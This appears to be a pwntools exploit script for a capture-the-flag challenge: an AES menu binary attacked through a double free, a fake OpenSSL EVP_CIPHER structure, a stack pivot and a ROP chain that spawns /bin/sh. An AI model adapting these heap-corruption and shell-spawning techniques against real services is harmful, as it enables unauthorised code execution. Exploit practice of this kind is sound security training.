from pwn import *
from Crypto.Cipher import AES 
from Crypto.Util.Padding import pad

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    p = remote('localhost', 7777)
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

def set_key(key):
    sendlineafter(p, b'> ', b'1')
    sendlineafter(p, b': ', key)

def set_iv(iv):
    sendlineafter(p, b'> ', b'2')
    sendlineafter(p, b': ', iv)

def set_data(data):
    sendlineafter(p, b'> ', b'3')
    sendlineafter(p, b': ', data)

def encrypt():
    sendlineafter(p, b'> ', b'4')

# Double free
set_key(b'')
set_data(b'AA'*0x98)
# malloc(0x98+0x10)
# EVP_CIPHER_CTX_new -> malloc(0xa8)
encrypt()

# 0x004548dd: mov rsp, rbx ; mov dword [rsp+0x38], eax ; mov rbp, qword [rsp+0x10] ; add rsp, 0x18 ; ret  ;  (1 found)
# 0x004011e6: pop rdi ; ret  ;  (1066 found)
# 0x00636a0d: pop rax ; pop rdx ; pop rbx ; ret  ;  (6 found)
# 0x00831510: pop rsi ; syscall  ;  (1 found)
# 0x004011de: pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1043 found)

# stack = 0xc000024130
stack = 0xc000022130
stack_pivot = 0x004548dd
pop_rdi = 0x004011e6
pop_5 = 0x004011de
pop_rax_rdx_rbx = 0x00636a0d
pop_rsi_syscall = 0x00831510

key = b'A' * 0x10
# Fake EVP_CIPHER on runtime stack
key += p32(0x1a3)       # nid
key += p32(0x10)        # block_size
key += p32(0x10)        # key_len
key += p32(0x10)        # iv_len
key += p64(0x1002)      # flags
key += p64(0x499d10)    # init
key += p64(0x499cb0)    # do_cipher
key += p64(stack_pivot) # cleanup
key += b'/bin/sh\0'

iv = b'A' * 0x10

# Fake EVP_CIPHER_CTX on heap
payload = p64(stack)

payload += p64(0xdeadbeef) * 2
payload += p64(pop_5)
payload += p64(0xdeadbeef) * 5
payload += p64(pop_rax_rdx_rbx)
payload += p64(59)
payload += p64(0) * 2
payload += p64(pop_rdi)
payload += p64(stack+0x30)
payload += p64(pop_rsi_syscall)
payload += p64(0)
payload += b'A' * (0x88-len(payload))

aes = AES.new(key[:0x10], AES.MODE_CBC, iv)
data = aes.decrypt(pad(payload, 16))

set_key(key.hex().encode())
set_iv(iv.hex().encode())
set_data(data.hex().encode())
# obuf == ctx
# EVP_EncryptUpdate (EVP_EncryptFinal_ex) -> Overwrite EVP_CIPHER_CTX
# EVP_CIPHER_CTX_reset -> Stack pivot (RBX = fake EVP_CIPHER_CTX)
encrypt()
p.interactive()
